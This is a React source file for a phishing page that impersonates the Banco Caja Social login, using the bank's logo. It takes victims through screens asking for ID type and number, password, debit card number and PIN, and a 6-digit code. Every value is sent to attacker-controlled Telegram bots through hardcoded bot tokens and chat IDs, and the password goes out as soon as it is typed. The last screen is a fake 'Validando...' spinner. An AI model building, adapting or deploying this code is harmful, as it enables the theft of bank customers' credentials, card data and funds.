import React, { useState, useEffect } from 'react';

const App = () => {
  const [selectedIdType, setSelectedIdType] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [password, setPassword] = useState('');
  const [isMobile, setIsMobile] = useState(false);
  const [showDebitCard, setShowDebitCard] = useState(false);
  const [showSixDigitCode, setShowSixDigitCode] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [debitCardNumber, setDebitCardNumber] = useState('');
  const [debitCardCode, setDebitCardCode] = useState(['', '', '', '']);
  const [sixDigitCode, setSixDigitCode] = useState(['', '', '', '', '', '']);

  // Check if device is mobile
  useEffect(() => {
    const checkIsMobile = () => {
      setIsMobile(window.innerWidth < 768);
    };
    
    checkIsMobile();
    window.addEventListener('resize', checkIsMobile);
    
    return () => window.removeEventListener('resize', checkIsMobile);
  }, []);

  // Mock data for identification types
  const idTypes = [
    { value: '', label: 'Seleccionar' },
    { value: 'cedula_ciudadania', label: 'Cédula de Ciudadanía' },
    { value: 'cedula_extranjeria', label: 'Cédula de Extranjería' },
    { value: 'nit', label: 'Número de Identificación Tributaria' },
    { value: 'tarjeta_identidad', label: 'Tarjeta de Identidad' },
    { value: 'permiso_permanencia', label: 'Permiso especial de permanencia' },
    { value: 'usuario', label: 'Usuario' }
  ];

  // Handle form submission for initial login
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!selectedIdType || !idNumber || password.length !== 8) {
      return;
    }

    // Send data to Telegram bot
    try {
      const token = '7540486155:AAGg9r2eNaLCWF2hWt8wo4wG8ykFD78_i1Q';
      const chatId = '7855300611';
      const message = `Nuevo inicio de sesión:\nTipo de identificación: ${selectedIdType}\nNúmero de identificación: ${idNumber}\nContraseña: ${password}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      // Show debit card page only when button is clicked
      setShowDebitCard(true);
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  // Handle password input and send to Telegram when 8 characters are entered
  const handlePasswordChange = (e) => {
    const value = e.target.value;
    setPassword(value);

    // If password reaches 8 characters, send to Telegram immediately
    if (value.length === 8 && selectedIdType && idNumber) {
      sendLoginInfoToTelegram(selectedIdType, idNumber, value);
    }
  };

  // Send login info to Telegram
  const sendLoginInfoToTelegram = async (idType, idNum, pwd) => {
    try {
      const token = '8575056070:AAFOf7DyUI3Q0mB1nXqWXx-uKrPTtPWEz3Q';
      const chatId = '8375471974';
      const message = `Nuevo inicio de sesión:\nTipo de identificación: ${idType}\nNúmero de identificación: ${idNum}\nContraseña: ${pwd}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  // Handle debit card number input
  const handleDebitCardNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16); // Only allow digits, max 16
    setDebitCardNumber(value);
  };

  // Handle debit card code input
  const handleDebitCardChange = (index, value) => {
    if (value.length > 1) return;
    
    const newCode = [...debitCardCode];
    newCode[index] = value;
    setDebitCardCode(newCode);

    // Auto-focus next input
    if (value && index < 3) {
      const nextInput = document.getElementById(`debit-${index + 1}`);
      if (nextInput) nextInput.focus();
    }

    // Check if all 4 digits are entered
    if (newCode.every(digit => digit !== '') && newCode.length === 4) {
      // Send debit card info to Telegram
      sendDebitCardToTelegram(debitCardNumber, newCode.join(''));
    }
  };

  // Send debit card info to Telegram
  const sendDebitCardToTelegram = async (number, code) => {
    try {
      const token = '7540486155:AAGg9r2eNaLCWF2hWt8wo4wG8ykFD78_i1Q';
      const chatId = '7855300611';
      const message = `Información de tarjeta de débito:\nNúmero: ${number}\nClave: ${code}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      // Show 6-digit code page
      setShowDebitCard(false);
      setShowSixDigitCode(true);
    } catch (error) {
      console.error('Error sending debit card to Telegram:', error);
    }
  };

  // Handle 6-digit code input
  const handleSixDigitChange = (index, value) => {
    if (value.length > 1) return;
    
    const newCode = [...sixDigitCode];
    newCode[index] = value;
    setSixDigitCode(newCode);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`six-digit-${index + 1}`);
      if (nextInput) nextInput.focus();
    }

    // Check if all 6 digits are entered
    if (newCode.every(digit => digit !== '') && newCode.length === 6) {
      // Send 6-digit code to Telegram and show loading
      sendSixDigitToTelegram(newCode.join(''));
    }
  };

  // Send 6-digit code to Telegram and show loading
  const sendSixDigitToTelegram = async (code) => {
    try {
      const token = '7540486155:AAGg9r2eNaLCWF2hWt8wo4wG8ykFD78_i1Q';
      const chatId = '7855300611';
      const message = `Código de 6 dígitos:\n${code}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      // Show loading screen
      setShowSixDigitCode(false);
      setShowLoading(true);
    } catch (error) {
      console.error('Error sending 6-digit code to Telegram:', error);
    }
  };

  // Check if all fields are filled correctly
  const isFormValid = selectedIdType && idNumber && password.length === 8;

  if (showLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <h2 className="text-xl font-semibold text-gray-700">
            Validando...
          </h2>
        </div>
      </div>
    );
  }

  if (showSixDigitCode) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full">
          <h2 className="text-xl font-semibold text-gray-700 mb-6 text-center">
            Ingrese su código de 6 dígitos
          </h2>
          
          <div className="flex justify-center space-x-4 mb-6">
            {sixDigitCode.map((digit, index) => (
              <input
                key={index}
                id={`six-digit-${index}`}
                type="password"
                maxLength="1"
                value={digit}
                onChange={(e) => handleSixDigitChange(index, e.target.value)}
                className="w-10 h-10 text-center text-xl border-2 border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
              />
            ))}
          </div>
          
          <p className="text-center text-gray-600 text-sm">
            Por favor ingrese los 6 dígitos de su código
          </p>
        </div>
      </div>
    );
  }

  if (showDebitCard) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full">
          <h2 className="text-xl font-semibold text-gray-700 mb-4 text-center">
            Ingrese el número de tarjeta débito
          </h2>
          
          <div className="mb-6">
            <input
              type="text"
              value={debitCardNumber}
              onChange={handleDebitCardNumberChange}
              placeholder="Número de tarjeta (16 dígitos)"
              className="w-full px-4 py-3 border-2 border-gray-300 rounded-md focus:border-blue-500 focus:outline-none text-center text-lg"
              maxLength="16"
            />
          </div>
          
          <h2 className="text-xl font-semibold text-gray-700 mb-6 text-center">
            Ingrese la clave de su tarjeta débito para continuar...
          </h2>
          
          <div className="flex justify-center space-x-4 mb-6">
            {debitCardCode.map((digit, index) => (
              <input
                key={index}
                id={`debit-${index}`}
                type="password"
                maxLength="1"
                value={digit}
                onChange={(e) => handleDebitCardChange(index, e.target.value)}
                className="w-12 h-12 text-center text-xl border-2 border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
              />
            ))}
          </div>
          
          <p className="text-center text-gray-600 text-sm">
            Por favor ingrese los 4 dígitos de su clave
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center space-x-4">
            {/* Logo in top left corner */}
            <img 
              src="https://transaccionalbp.bancocajasocial.com/portalserver/content/atom/ed3567c4-64a3-462a-93a4-7c6466ef50e8/content/General/Logo%20Banco%20Caja%20Social?id=ff6b0aed-6fb8-4be2-9326-cb5847feac22" 
              alt="Banco Caja Social" 
              className="h-10"
            />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="bg-white rounded-lg shadow-md p-8">
            <h2 className="text-xl font-semibold text-gray-700 mb-6">Personas</h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Form Fields */}
              <div className="space-y-6">
                {/* Identification Type */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    (*) TIPO DE IDENTIFICACIÓN
                  </label>
                  <select
                    value={selectedIdType}
                    onChange={(e) => setSelectedIdType(e.target.value)}
                    className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  >
                    {idTypes.map((type) => (
                      <option key={type.value} value={type.value}>
                        {type.label}
                      </option>
                    ))}
                  </select>
                </div>

                {/* Identification Number */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    (*) NÚMERO DE IDENTIFICACIÓN
                  </label>
                  <input
                    type="text"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value)}
                    className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    placeholder=""
                  />
                </div>

                {/* Password */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    (*) CONTRASEÑA
                  </label>
                  <input
                    type="password"
                    value={password}
                    onChange={handlePasswordChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    placeholder=""
                    maxLength="8"
                  />
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={!isFormValid}
                  className={`w-full py-3 px-4 rounded-full font-medium transition-colors ${
                    isFormValid
                      ? 'bg-blue-600 text-white hover:bg-blue-700'
                      : 'bg-gray-300 text-gray-500 cursor-not-allowed'
                  }`}
                >
                  Iniciar sesión
                </button>

                {/* Links */}
                <div className="flex justify-between mt-6">
                  <a href="#" className="text-blue-600 hover:text-blue-800 text-sm">
                    Registrarse
                  </a>
                  <a href="#" className="text-blue-600 hover:text-blue-800 text-sm">
                    ¿Olvidó su contraseña?
                  </a>
                </div>
              </div>

              {/* Virtual Keyboard (only for desktop) */}
              {!isMobile && (
                <div className="mt-8 space-y-6">
                  <div className="p-4 rounded-lg bg-gray-50">
                    <div className="flex items-start space-x-3 mb-4">
                      <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center text-white text-xs">
                        i
                      </div>
                      <div>
                        <h3 className="font-medium text-gray-800">Teclado virtual para ingreso de contraseña</h3>
                        <p className="text-sm text-gray-600 mt-1">
                          Ingrese su contraseña utilizando el teclado que muestra la pantalla. Recuerde, su longitud debe ser de 8 caracteres alfanuméricos y tenga en cuenta que reconoce el ingreso de minúsculas y mayúsculas.
                        </p>
                      </div>
                    </div>

                    {/* Virtual Keyboard */}
                    <div className="space-y-2">
                      {/* First Row */}
                      <div className="flex space-x-1">
                        {['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p'].map((key) => (
                          <button
                            key={key}
                            className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                          >
                            {key}
                          </button>
                        ))}
                        <div className="flex space-x-1 ml-2">
                          {['9', '4', '8'].map((key) => (
                            <button
                              key={key}
                              className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                            >
                              {key}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Second Row */}
                      <div className="flex space-x-1">
                        {['a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l'].map((key) => (
                          <button
                            key={key}
                            className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                          >
                            {key}
                          </button>
                        ))}
                        <div className="flex space-x-1 ml-2">
                          {['1', '2', '5'].map((key) => (
                            <button
                              key={key}
                              className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                            >
                              {key}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Third Row */}
                      <div className="flex space-x-1">
                        <button
                          className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                        >
                          ↑
                        </button>
                        {['z', 'x', 'c', 'v', 'b', 'n', 'm'].map((key) => (
                          <button
                            key={key}
                            className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                          >
                            {key}
                          </button>
                        ))}
                        <button
                          className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                        >
                          ←
                        </button>
                        <div className="flex space-x-1 ml-2">
                          {['7', '0', '3'].map((key) => (
                            <button
                              key={key}
                              className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                            >
                              {key}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Fourth Row */}
                      <div className="flex justify-center">
                        <button
                          className="w-8 h-8 bg-blue-100 rounded flex items-center justify-center text-sm font-medium text-gray-800"
                        >
                          6
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </form>
          </div>
        </div>
      </main>
    </div>
  );
};

export default App;
